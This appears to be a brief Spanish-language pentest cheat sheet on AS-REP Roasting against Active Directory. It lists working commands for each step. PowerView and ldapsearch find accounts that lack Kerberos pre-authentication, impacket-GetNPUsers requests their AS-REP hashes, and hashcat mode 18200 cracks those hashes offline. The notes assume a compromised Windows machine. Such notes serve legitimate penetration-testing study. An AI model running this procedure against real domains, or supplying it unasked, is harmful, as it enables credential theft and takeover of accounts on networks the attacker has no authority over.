# ASREPRoasting attack
- ASREPRoasting es otro ataque que pide TGT que **NO requieran pre-auth en kerberos**.
-Al obtener el TGT, el atacante puede extraer hashes y realizar ataques de fuerza bruta offline.

## Con powerview
- Importante tener cargado powerview.ps1 y todo el armatoste en la maquina windows comprometida
- `Import-Module .\PowerView.ps1`
- `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth`

## con LDAP search
- `ldapsearch -x -H ldap://<domain_controller> -D "<username>" -w <password> -b "dc=example,dc=com" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"`

## Solicitar TGT
- `impacket-GetNPUsers. DOMINIO.LOCAL/ -usersfile users.txt -format hashcat -dc-ip <domain_controller_ip>`

## hashcat
- `hashcat -m 18200 hashes.txt /path/to/wordlist`